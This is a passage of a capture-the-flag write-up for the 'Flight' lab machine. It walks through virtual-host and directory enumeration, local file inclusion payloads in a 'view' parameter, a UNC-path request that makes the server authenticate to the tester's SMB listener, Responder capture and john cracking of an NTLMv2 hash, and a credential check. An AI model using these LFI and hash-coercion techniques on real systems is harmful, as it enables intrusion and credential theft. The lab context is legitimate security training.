</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>Found:<span class="w"> </span>school.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>Found:<span class="w"> </span>%20.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>Found:<span class="w"> </span><span class="nv">$FILE</span>.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>Found:<span class="w"> </span><span class="nv">$file</span>.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>Found:<span class="w"> </span>*checkout*.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>Found:<span class="w"> </span>*docroot*.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>Found:<span class="w"> </span>School.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span></code></pre></div>
<p>interesting, it has indeed found virtual hosts, specifically the one with status 200:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Found:<span class="w"> </span>school.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span></code></pre></div>
<p>But what to do with it? Well, since we found this one, lets add it on etc hosts:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;10.129.148.8 school.flight.htb&#39; &gt;&gt; /etc/hosts&quot;</span>
</span></code></pre></div>
<p>And then navigate there on our browser:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image2.png" /></p>
<p>Just like the homepage, nothing is clickable here and no redirects were found by pressing buttons/links.. hm how to move forward here?</p>
<p>First, we could try finding information about the website’s tech stack (versions etc)</p>
<h3 id="banner-grabbing_1">Banner grabbing</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>whatweb<span class="w"> </span>school.flight.htb
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>http://school.flight.htb<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.52<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/1.1.1m<span class="w"> </span>PHP/8.1.1<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.228.120<span class="o">]</span>,<span class="w"> </span>OpenSSL<span class="o">[</span><span class="m">1</span>.1.1m<span class="o">]</span>,<span class="w"> </span>PHP<span class="o">[</span><span class="m">8</span>.1.1<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Aviation<span class="w"> </span>School<span class="o">]</span>,<span class="w"> </span>X-Powered-By<span class="o">[</span>PHP/8.1.1<span class="o">]</span>
</span></code></pre></div>
<p>It seems that this is an apache web server, version <code>2.4.52</code> and also i can see <code>X-Powered-By[PHP/8.1.1]</code> indicating php is involved.</p>
<p>The version can also be seen by <code>wappalyzer</code> :</p>
<p><img alt="image.png" src="../MediaFiles/flight_image3.png" /></p>
<p>Before we move on, lets enumerate this one for directories too like we did for <code>flight.htb</code> :</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-e<span class="w"> </span>-t50<span class="w"> </span>-x<span class="w"> </span>php,txt,html<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-u<span class="w"> </span>school.flight.htb
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="o">===============================================================</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="o">===============================================================</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://school.flight.htb
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">50</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>,400,429
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.6
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>php,txt,html
</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Expanded:<span class="w">                </span><span class="nb">true</span>
</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="o">===============================================================</span>
</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="o">===============================================================</span>
</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>http://school.flight.htb/.html<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>http://school.flight.htb/images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">347</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://school.flight.htb/images/<span class="o">]</span>
</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>http://school.flight.htb/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>http://school.flight.htb/blog.html<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3618</span><span class="o">]</span>
</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>http://school.flight.htb/home.html<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">2683</span><span class="o">]</span>
</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a>http://school.flight.htb/about.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">1689</span><span class="o">]</span>
</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>http://school.flight.htb/Images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">347</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://school.flight.htb/Images/<span class="o">]</span>
</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>http://school.flight.htb/Home.html<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">2683</span><span class="o">]</span>
</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>http://school.flight.htb/About.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">1689</span><span class="o">]</span>
</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>http://school.flight.htb/Index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>http://school.flight.htb/Blog.html<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3618</span><span class="o">]</span>
</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>http://school.flight.htb/styles<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">347</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://school.flight.htb/styles/<span class="o">]</span>
</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>http://school.flight.htb/licenses<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">425</span><span class="o">]</span>
</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>http://school.flight.htb/examples<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">503</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">406</span><span class="o">]</span>
</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>http://school.flight.htb/IMAGES<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">347</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://school.flight.htb/IMAGES/<span class="o">]</span>
</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a>http://school.flight.htb/%20<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a>http://school.flight.htb/INDEX.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3996</span><span class="o">]</span>
</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a>http://school.flight.htb/*checkout*.html<span class="w">      </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>http://school.flight.htb/*checkout*.txt<span class="w">       </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a>http://school.flight.htb/*checkout*.php<span class="w">       </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-37"><a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a>http://school.flight.htb/*checkout*<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-38"><a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a>http://school.flight.htb/phpmyadmin<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">425</span><span class="o">]</span>
</span><span id="__span-18-39"><a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a>http://school.flight.htb/HOME.html<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">2683</span><span class="o">]</span>
</span><span id="__span-18-40"><a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a>http://school.flight.htb/webalizer<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">425</span><span class="o">]</span>
</span><span id="__span-18-41"><a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a>http://school.flight.htb/Styles<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">347</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://school.flight.htb/Styles/<span class="o">]</span>
</span><span id="__span-18-42"><a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>http://school.flight.htb/*docroot*.txt<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
</span><span id="__span-18-43"><a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>http://school.flight.htb/ABOUT.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">1689</span><span class="o">]</span>
</span></code></pre></div>
<p>Okay, found some pages here, what does these tell us tho? lets ty navigating on some of them:</p>
<p><code>index.php</code> : actually goes into the home page</p>
<p><img alt="image.png" src="../MediaFiles/flight_image4.png" /></p>
<p><code>/images</code> shows the images and gifs of the page:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image5.png" /></p>
<p>Now sth i did not notice earlier, there are buttons that appear only when i hover upon them:</p>
<p><code>Home</code> basically is the home page and does not redirect elsewhere: full url <a href="http://school.flight.htb/index.php?view=home.html"><code>http://school.flight.htb/index.php?view=home.html</code></a></p>
<p><img alt="image.png" src="../MediaFiles/flight_image6.png" /></p>
<p><code>About us</code> . full url: <a href="http://school.flight.htb/index.php?view=about.html"><code>http://school.flight.htb/index.php?view=about.html</code></a></p>
<p><img alt="image.png" src="../MediaFiles/flight_image7.png" /></p>
<p>Interesting, this one goes on another page:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image8.png" /></p>
<p>It mentions template, in the lower part of the page:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Template<span class="w"> </span>details
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Version<span class="w"> </span><span class="m">4</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>Website<span class="w"> </span>Template<span class="w"> </span>details,<span class="w"> </span>discussion<span class="w"> </span>and<span class="w"> </span>updates<span class="w"> </span><span class="k">for</span><span class="w"> </span>this<span class="w"> </span>Aviation<span class="w"> </span>School<span class="w"> </span>template.<span class="w"> </span>Website<span class="w"> </span>Template<span class="w"> </span>design<span class="w"> </span>by<span class="w"> </span>Free<span class="w"> </span>Website<span class="w"> </span>Templates.<span class="w"> </span>Please<span class="w"> </span>feel<span class="w"> </span>free<span class="w"> </span>to<span class="w"> </span>remove<span class="w"> </span>some<span class="w"> </span>or<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>text<span class="w"> </span>and<span class="w"> </span>links<span class="w"> </span>of<span class="w"> </span>this<span class="w"> </span>page<span class="w"> </span>and<span class="w"> </span>replace<span class="w"> </span>it<span class="w"> </span>with<span class="w"> </span>your<span class="w"> </span>own<span class="w"> </span>About<span class="w"> </span>content.
</span></code></pre></div>
<p>I dont know if this might be a hint, we will keep that in mind for later if needed.</p>
<p><code>Blog</code> , full url <a href="http://school.flight.htb/index.php?view=blog.html"><code>http://school.flight.htb/index.php?view=blog.html</code></a></p>
<p><img alt="image.png" src="../MediaFiles/flight_image9.png" /></p>
<p>In this page no redirects where observed, nothing is clickable apart from the navigation bar (Home, About us, Blog)</p>
<h2 id="exploiting-the-webapp">Exploiting the WebApp</h2>
<p>Alright, we found some more pages, but i mentioned their full url’s on purpose! What do we know about these urls?</p>
<p>Well, the urls contain flags/arguments, like <code>?</code> sth, this is called query string, and inside it flags/paramteres are located. Parameters are separated with <code>&amp;</code> like this example below:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>http://example.com/index.php?view<span class="o">=</span>home<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="m">5</span>
</span></code></pre></div>
<p>So what types of vulnerabilities can be exploited via parameters on the url?</p>
<ul>
<li>LFI</li>
<li>RFI</li>
<li>Path traversal</li>
</ul>
<h3 id="checking-for-lfi">Checking for LFI</h3>
<p>Checking some windows system files first, with <code>relative</code> paths:</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>/index.php?view=../../../../windows/win.ini
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>/index.php?view=../../../../windows/system32/drivers/etc/hosts
</span></code></pre></div>
<p>But no luck, again received Suspicious Activity Blocked</p>
<p>Lets try now with <code>absolute</code> paths:</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
</span></code></pre></div>
<p>Nice! this did not get blocked and we received the file’s contents:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image10.png" /></p>
<p>I guess the previous relative paths got blocked because it has detected the <code>../</code> parts.</p>
<p>Before moving forwards, we could try doing some fuzzing values for the <code>view</code> paramter here to see if we can get any vaulable files:</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wfuzz -f ./fuzz-output.csv,csv -c -w ../Common/file_inclusion_windows.txt --hw 89,95 http://school.flight.htb/index.php?view=FUZZ
</span></code></pre></div>
<p>Unfortunately, i got nothing interesting from this one… lets move on</p>
<p>Lets try sth else, like php filter tricks to bypass extension checks:</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/index.php?view=php://filter/convert.base64-encode/resource=index.php
</span></code></pre></div>
<p>again blocked….</p>
<h3 id="checking-for-rfi">Checking for RFI</h3>
<p>Since we found that LFI exists, the next step would be to check for RFI too.</p>
<p>Lets check for UNC paths, this will work if <code>allow_url_include</code> or SMB fetching is enabled, and the app might try to load remote files.</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>http://school.flight.htb/index.php?view=//10.10.14.180/myamazingshare
</span></code></pre></div>
<p>we could also try to capture the NTLM hash of the account running the web server by making it authenticate against our SMB share.</p>
<p>IMPORTANT!: it did not work with <code>\</code> it got blocked, it only worked with <code>/</code></p>
<p>First start the responder</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sudo responder -I tun0 -wP
</span></code></pre></div>
<p>then hit the previous url on the browser, and receive the response on the responder with the NTLM hash</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>[+] Listening for events...
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>[SMB] NTLMv2-SSP Client   : 10.129.228.120
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>[SMB] NTLMv2-SSP Username : flight\svc_apache
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>[SMB] NTLMv2-SSP Hash     : svc_apache::flight:b3e91d07e8f0b746:04154593360088968E55D50CACE9BDC9:0101000000000000808519825913DC014B2194F5D02C9DC00000000002000800490036003300510001001E00570049004E002D004A00530052004100430032004F004C0030004100500004003400570049004E002D004A00530052004100430032004F004C003000410050002E0049003600330051002E004C004F00430041004C000300140049003600330051002E004C004F00430041004C000500140049003600330051002E004C004F00430041004C0007000800808519825913DC01060004000200000008003000300000000000000000000000003000005108C442C3741020BE0C1669030BA6011CB2E34E998B97B6DD2F82EF286BF89D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380030000000000000000000
</span></code></pre></div>
<p>nice! we got the <code>NTLM</code> hash of <code>svc_apache</code> user, </p>
<h2 id="cracking-ntlm-hash">Cracking NTLM hash</h2>
<p>unzip the wordlist (on HTB pwnbox its on zip format)</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo gunzip /usr/share/wordlists/rockyou.txt.gz
</span></code></pre></div>
<p>next crack it with john the ripper</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>john svc_hash --wordlist=/usr/share/wordlists/rockyou.txt
</span></code></pre></div>
<p>it was cracked successfully, and we got the password:</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Using default input encoding: UTF-8
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Will run 4 OpenMP threads
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>S@Ss!K@*t13      (svc_apache)     
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>1g 0:00:00:04 DONE (2025-08-22 12:06) 0.2136g/s 2278Kp/s 2278Kc/s 2278KC/s SADSAM..S42150461
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>Session completed. 
</span></code></pre></div>
<p>lets now see where we can login with those creds:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>svc_apache
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>S@Ss!K@*t13
</span></code></pre></div>
<h2 id="checking-where-we-can-login-with-svc_apache-creds">Checking where we can login with svc_apache creds</h2>
<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: <a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>flight.htb<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span>
</span></code></pre></div>
